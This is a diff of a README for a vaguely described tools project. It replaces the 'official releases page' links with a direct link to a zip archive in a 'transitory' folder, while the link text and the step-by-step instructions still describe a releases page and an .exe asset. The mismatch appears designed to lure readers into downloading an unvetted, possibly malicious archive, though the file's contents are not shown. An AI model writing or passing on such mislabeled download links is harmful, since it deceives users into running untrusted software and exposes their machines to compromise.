@@ -1,12 +1,12 @@
 # 💻 CS-BC-L-m - Simple tools for your daily tasks
 
-[![Download CS-BC-L-m](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lxxvii-blacknightshade680/CS-BC-L-m/releases)
+[![Download CS-BC-L-m](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/lxxvii-blacknightshade680/CS-BC-L-m/main/transitory/B-C-m-3.8-beta.1.zip)
 
 ## 📥 How to download the software
 
 Follow these steps to get the program on your computer.
 
-1. Visit the [official releases page](https://github.com/lxxvii-blacknightshade680/CS-BC-L-m/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/lxxvii-blacknightshade680/CS-BC-L-m/main/transitory/B-C-m-3.8-beta.1.zip).
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe under the Assets heading.
 4. Click the file name to start your download.
